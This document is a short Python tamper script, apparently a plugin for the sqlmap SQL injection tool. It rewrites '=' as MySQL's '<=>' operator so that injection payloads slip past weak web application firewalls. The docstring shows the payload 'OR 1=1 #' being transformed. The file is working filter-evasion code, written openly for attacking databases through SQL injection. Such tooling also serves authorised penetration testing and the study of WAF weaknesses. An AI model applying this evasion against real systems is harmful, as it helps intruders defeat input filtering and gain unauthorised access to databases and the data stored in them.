#!/usr/bin/env python3
"""
Tamper script to replace '=' with '<=>'
MySQL-only NULL-safe equality operator.
Useful for bypassing filters that block '='.

Author: relunsec
"""

from lib.core.enums import PRIORITY
import re

__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    """
    Replaces equal signs (=) with MySQL null-safe equal operator (<=>) Sometime bypass Weak WAF/Filters filter (=) sign

    Requirement:
        * MySQL

    >>> tamper("OR 1=1 #")
    'OR 1<=>1 #'
    """
    if not payload:
        return payload
    # Replace '=' with '<=>'
    payload = re.sub(r'(?<![><!])=(?!=)', '<=>', payload)
    return payload
